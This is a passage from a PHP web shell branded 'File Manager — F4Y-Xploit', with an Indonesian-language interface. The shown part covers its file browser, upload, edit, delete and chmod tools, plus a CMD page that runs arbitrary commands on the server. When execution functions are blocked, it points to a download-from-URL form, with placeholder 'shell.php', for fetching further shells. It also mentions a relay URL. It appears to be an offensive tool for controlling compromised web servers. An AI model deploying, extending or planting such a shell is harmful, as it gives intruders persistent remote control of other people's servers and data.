        zip:'Yakin ingin mengarsipkan item yang dipilih?',
        copy:'Salin item yang dipilih ke clipboard?',
        cut:'Potong item yang dipilih ke clipboard?'
    };
    return confirm(msgs[action]||'Lanjutkan?');
}
function showRenameModal(oldPath,currentName){
    document.getElementById('renameOldPath').value=oldPath;
    document.getElementById('renameNewName').value=currentName;
    new bootstrap.Modal(document.getElementById('renameModal')).show();
}
function showChmodModal(itemPath,currentPermsOctal){
    document.getElementById('chmodPath').value=itemPath;
    document.getElementById('chmodOctal').value=currentPermsOctal;
    const o=parseInt(currentPermsOctal[1]),g=parseInt(currentPermsOctal[2]),ot=parseInt(currentPermsOctal[3]);
    document.getElementById('owner_read').checked=(o&4);
    document.getElementById('owner_write').checked=(o&2);
    document.getElementById('owner_execute').checked=(o&1);
    document.getElementById('group_read').checked=(g&4);
    document.getElementById('group_write').checked=(g&2);
    document.getElementById('group_execute').checked=(g&1);
    document.getElementById('others_read').checked=(ot&4);
    document.getElementById('others_write').checked=(ot&2);
    document.getElementById('others_execute').checked=(ot&1);
    updateOctalFromCheckboxes();
    new bootstrap.Modal(document.getElementById('chmodModal')).show();
}
function updateOctalFromCheckboxes(){
    let o=0,g=0,ot=0;
    if(document.getElementById('owner_read').checked)o+=4;
    if(document.getElementById('owner_write').checked)o+=2;
    if(document.getElementById('owner_execute').checked)o+=1;
    if(document.getElementById('group_read').checked)g+=4;
    if(document.getElementById('group_write').checked)g+=2;
    if(document.getElementById('group_execute').checked)g+=1;
    if(document.getElementById('others_read').checked)ot+=4;
    if(document.getElementById('others_write').checked)ot+=2;
    if(document.getElementById('others_execute').checked)ot+=1;
    document.getElementById('chmodOctal').value='0'+o+g+ot;
}
document.addEventListener('DOMContentLoaded',function(){
    document.querySelectorAll('#chmodModal input[type="checkbox"]')
        .forEach(cb=>cb.addEventListener('change',updateOctalFromCheckboxes));
});
function clearCmdOutput(){
    window.location.href="?action=cmd&d=<?php echo $cwd; ?>";
}
</script>
</head>
<body class='p-4'>

<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <div class="container-fluid">
    <a class="navbar-brand" href="?d=<?php echo urlencode($cwd); ?>">File Manager</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <li class="nav-item"><a class="btn nav-link" href="<?php echo htmlspecialchars($self); ?>"><i class='fa fa-home'></i> Home</a></li>
        <li class="nav-item"><button class="btn nav-link" data-bs-toggle="modal" data-bs-target='#createModal'><i class='fa fa-plus'></i> New</button></li>
        <li class="nav-item"><button class="btn nav-link" data-bs-toggle='modal' data-bs-target='#uploadModal'><i class='fa fa-upload'></i> Upload</button></li>
        <?php if (!empty($clipboard_items)): ?>
        <li class="nav-item">
          <form method='post' class='d-inline-block'>
            <input type='hidden' name='paste_item' value='1'>
            <button type='submit' class='btn nav-link'><i class='fa fa-paste'></i> Paste (<?php echo ($clipboard_type==='cut'?'Cut':'Copy')." ".count($clipboard_items); ?>)</button>
          </form>
        </li>
        <?php endif; ?>
        <li class="nav-item"><a href='?action=password&d=<?php echo urlencode($cwd); ?>' class='btn nav-link'><i class='fa fa-lock'></i> Password</a></li>
        <li class="nav-item"><a href='?action=info&d=<?php echo urlencode($cwd); ?>' class='btn nav-link'><i class='fa fa-info-circle'></i> Info</a></li>
        <li class="nav-item"><a href='?action=cmd&d=<?php echo urlencode($cwd); ?>' class='btn nav-link'><i class='fa fa-terminal'></i> CMD</a></li>
      </ul>
      <button onclick='toggleTheme()' class='btn btn-dark'><i class='fa fa-adjust'></i> Theme</button>
    </div>
  </div>
</nav>

<div class="container-fluid pt-3">
<?php if ($msg) echo "<div class='alert alert-info mt-3'>$msg</div>"; ?>
<?php if (isset($_GET['cmd_output']) && isset($_GET['action']) && $_GET['action']==='cmd'): ?>
    <div class='alert alert-secondary mt-3'>Output:<br><?php echo urldecode($_GET['cmd_output']); ?></div>
<?php endif; ?>
<br><br>

<div class="table-responsive-custom mb-3">
<table class='table table-bordered table-sm'><thead><tr><th>
    <i class='fa fa-folder'></i> <strong><?php echo breadcrumbs($cwd, $self); ?></strong>
</th></tr></thead></table>
</div>

<?php
if (isset($_GET['action'])) {
    echo "<a href='?d=".urlencode($cwd)."' class='btn btn-sm btn-secondary mb-3 mt-2'>← Kembali</a>";
    if ($_GET['action']==='password') {
        echo "<form method='post' class='mb-3'>
        <label class='form-label'>Set Password Baru:</label>
        <input type='password' name='setpass' class='form-control mb-2' placeholder='Password baru' style='max-width:300px;'>
        <button class='btn btn-warning'>Simpan Password</button></form>
        <form method='post' class='mt-2'>
        <input type='hidden' name='delpass' value='1'>
        <button class='btn btn-danger'>Hapus Password</button></form>";
    } elseif ($_GET['action']==='info') {
        echo '<div class="container"><h1 class="mb-3">File Manager — F4Y-Xploit</h1><hr>
        <p><strong>Author:</strong> <span style="color:#0f0">F4Y-Xploit</span></p>
        <p><strong>Contact:</strong> <a href="https://t.me/Fayanzo" target="_blank">Telegram</a></p>
        <p class="text-muted">Versi: 1.0 | Update: 2025</p></div>';
    } elseif ($_GET['action']==='cmd') {
        $active_exec = _cmd_available();
        if ($active_exec) echo "<div class='alert alert-success py-1'><i class='fa fa-check-circle'></i> Metode eksekusi aktif: <strong><code>$active_exec</code></strong></div>";
        else echo "<div class='alert alert-warning'><strong>⚠ Semua fungsi eksekusi diblokir.</strong> Gunakan fitur Import Raw File dari URL atau isi <code>\$relay_url</code> di file manager.</div>";

        echo "<form method='post' class='mt-3'>
        <label class='form-label'>Execute Command:</label>
        <div class='input-group mb-2'>
            <input name='command' id='command_input' placeholder='Masukkan perintah...' class='form-control'>
            <button type='submit' class='btn btn-primary' name='cmd_exec'>Execute</button>
            <button type='button' class='btn btn-outline-secondary' onclick='clearCmdOutput()'>Clear</button>
        </div></form>";

        if (!empty($_SESSION['cmd_history'])) {
            echo "<h6 class='mt-4'>Riwayat Perintah:</h6>
            <div class='list-group mb-3' style='max-height:200px;overflow-y:auto;'>";
            foreach ($_SESSION['cmd_history'] as $hist_cmd)
                echo "<a href='#' class='list-group-item list-group-item-action list-group-item-secondary' onclick='document.getElementById(\"command_input\").value=\"".addslashes($hist_cmd)."\";return false;'>".htmlspecialchars($hist_cmd)."</a>";
            echo "</div>
            <form method='post'>
                <button type='submit' name='clear_cmd_history' class='btn btn-sm btn-danger' onclick='return confirm(\"Hapus riwayat?\")'>Hapus Riwayat</button>
            </form>";
        }

        echo "<hr><h6 class='mt-3'>📥 Import Raw File dari URL:</h6>
        <form method='post' class='mb-3'>
            <label class='form-label'>🔗 URL Raw File:</label>
            <input type='url' name='url_to_download_raw' placeholder='https://example.com/shell.php' class='form-control mb-2' required>
            <label class='form-label'>💾 Simpan Sebagai (nama file):</label>
            <input type='text' name='filename_to_save' placeholder='hasil.php' class='form-control mb-2' required>
            <button type='submit' class='btn btn-success' name='download_url_and_save'>Download & Simpan</button>
        </form>";
    }
    echo "</div></body></html>";
    exit;
}
?>

<form method='post' id='batch_form'>
<div class="table-responsive-custom">
<table class='table table-bordered table-sm'><thead>
<tr>
  <th><input type='checkbox' onclick='toggleAll(this)'></th>
  <th>Name</th><th>Size</th><th>Last Modified</th><th>Perms</th><th>Actions</th>
</tr></thead><tbody>
<?php
foreach (list_dir($cwd) as $i) {
    $n          = htmlspecialchars($i['name']);
    $p          = htmlspecialchars($i['path']);
    $encoded_p  = urlencode($i['path']);
    $perms_oct  = perms_to_octal(@fileperms($i['path']));
    $row_class  = '';
    if (in_array(realpath($i['path']), $clipboard_items))
        $row_class = 'clipboard-'.$clipboard_type;

    echo "<tr class='$row_class'>";
    echo "<td><input type='checkbox' name='selected_items[]' value='$encoded_p'></td>";
    echo "<td>".($i['is_dir']
        ? "<a href='?d=$encoded_p'><i class='fa fa-folder-o'></i> $n</a>"
        : "<i class='fa fa-file-o'></i> $n")."</td>";
    echo "<td>".formatSize($i['size'])."</td>";
    echo "<td>".date('Y-m-d H:i',$i['mtime'])."</td>";
    echo "<td>".perms($i['path'])." ($perms_oct)</td>";
    echo "<td class='d-flex flex-wrap gap-1'>"
        .(!$i['is_dir'] ? "<a href='?edit=$encoded_p&d=".urlencode($cwd)."' class='btn btn-sm btn-warning'><i class='fa fa-edit'></i></a>" : "")
        .(!$i['is_dir'] ? "<a href='?download=$encoded_p&d=".urlencode($cwd)."' class='btn btn-sm btn-success'><i class='fa fa-download'></i></a>" : "")
        ."<button type='button' class='btn btn-sm btn-secondary' onclick='showRenameModal(\"$encoded_p\",\"$n\")'><i class='fa fa-pencil'></i></button>"
        ."<button type='button' class='btn btn-sm btn-dark' onclick='showChmodModal(\"$encoded_p\",\"$perms_oct\")'><i class='fa fa-key'></i></button>"
        ."<a href='?delete=$encoded_p&d=".urlencode($cwd)."' class='btn btn-sm btn-danger' onclick='return confirm(\"Hapus ".($i['is_dir']?"folder beserta isinya":"file ini")."?\")'><i class='fa fa-trash-o'></i></a>"
        .(preg_match('/\.zip$/i',$n)&&!$i['is_dir'] ? "<a href='?unzip=$encoded_p&d=".urlencode($cwd)."' class='btn btn-sm btn-info' onclick='return confirm(\"Ekstrak file ini?\")'><i class='fa fa-file-archive-o'></i></a>" : "")
        ."</td></tr>";
}
?>
</tbody></table>
</div>

<div class='mb-3 d-flex gap-2' id='batchActionsContainer'>
    <select name='batch_action' class='form-select' style='width:auto;'>
        <option value='delete'>Delete</option>
        <option value='zip'>Zip</option>
        <option value='copy'>Copy</option>
        <option value='cut'>Cut</option>
    </select>
    <button type='submit' class='btn btn-primary' onclick='return confirmAction(this.form.batch_action.value);'>Execute</button>
</div>
</form>

<!-- Upload Modal -->
<div class="modal fade" id="uploadModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog"><div class="modal-content">
    <div class="modal-header">
      <h5 class="modal-title">Upload File</h5>
      <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
    </div>
    <form method="post" enctype="multipart/form-data">
      <div class="modal-body"><input type="file" name="uploadfile" class="form-control"></div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
        <button type="submit" class="btn btn-primary" name="uploadfile">Upload</button>
      </div>
    </form>
  </div></div>
</div>

<!-- Create Modal -->
<div class="modal fade" id="createModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog"><div class="modal-content">
    <div class="modal-header">
      <h5 class="modal-title">Buat Baru</h5>
      <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
    </div>
    <div class="modal-body">
      <h6><i class='fa fa-file-code-o'></i> Buat File Baru</h6>
      <form method="post" class="mb-4">
        <input name="newfile" placeholder="Nama file (contoh: index.php)" class="form-control mb-2" required>
        <textarea name="filedata" class="form-control mb-2" placeholder="Isi file (opsional)" rows="5"></textarea>
        <button type="submit" class="btn btn-success">Buat File</button>
      </form>
      <hr>
      <h6><i class='fa fa-folder-open-o'></i> Buat Folder Baru</h6>
      <form method="post">
        <input name="newfolder" placeholder="Nama folder" class="form-control mb-2" required>
        <button type="submit" class="btn btn-success">Buat Folder</button>
      </form>
    </div>
    <div class="modal-footer">
      <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
    </div>
  </div></div>
</div>

<!-- Rename Modal -->
<div class="modal fade" id="renameModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog"><div class="modal-content">
    <div class="modal-header">
      <h5 class="modal-title">Rename</h5>
      <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
    </div>
    <form method="post">
      <div class="modal-body">
        <input type="hidden" name="old_path_rename" id="renameOldPath">
        <div class="mb-3">
          <label class="form-label">Nama Baru:</label>
          <input type="text" name="new_name" id="renameNewName" class="form-control" required>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
        <button type="submit" class="btn btn-primary" name="rename_submit">Rename</button>
      </div>
    </form>
  </div></div>
</div>

<!-- CHMOD Modal -->
<div class="modal fade" id="chmodModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog"><div class="modal-content">
    <div class="modal-header">
      <h5 class="modal-title">Ubah Izin (CHMOD)</h5>
      <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
    </div>
    <form method="post">
      <div class="modal-body">
        <input type="hidden" name="chmod_path" id="chmodPath">
        <div class="mb-3">
          <label class="form-label">Oktal:</label>
          <input type="text" name="chmod_octal" id="chmodOctal" class="form-control" pattern="[0-7]{3,4}" required>
          <small class="text-muted">Contoh: 755, 644</small>
        </div>
        <div class="mb-3">
          <h6>Simbolik:</h6>
          <div class="row">
            <div class="col-4"><strong>Owner</strong><br>
              <div class="form-check"><input class="form-check-input" type="checkbox" id="owner_read"><label class="form-check-label" for="owner_read">Read</label></div>
              <div class="form-check"><input class="form-check-input" type="checkbox" id="owner_write"><label class="form-check-label" for="owner_write">Write</label></div>
              <div class="form-check"><input class="form-check-input" type="checkbox" id="owner_execute"><label class="form-check-label" for="owner_execute">Execute</label></div>
            </div>
            <div class="col-4"><strong>Group</strong><br>
              <div class="form-check"><input class="form-check-input" type="checkbox" id="group_read"><label class="form-check-label" for="group_read">Read</label></div>
              <div class="form-check"><input class="form-check-input" type="checkbox" id="group_write"><label class="form-check-label" for="group_write">Write</label></div>
              <div class="form-check"><input class="form-check-input" type="checkbox" id="group_execute"><label class="form-check-label" for="group_execute">Execute</label></div>
            </div>
            <div class="col-4"><strong>Others</strong><br>
              <div class="form-check"><input class="form-check-input" type="checkbox" id="others_read"><label class="form-check-label" for="others_read">Read</label></div>
              <div class="form-check"><input class="form-check-input" type="checkbox" id="others_write"><label class="form-check-label" for="others_write">Write</label></div>
              <div class="form-check"><input class="form-check-input" type="checkbox" id="others_execute"><label class="form-check-label" for="others_execute">Execute</label></div>
            </div>
          </div>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
        <button type="submit" class="btn btn-primary" name="set_chmod">Terapkan</button>
      </div>
    </form>
  </div></div>
</div>

</div>
</body>
</html>
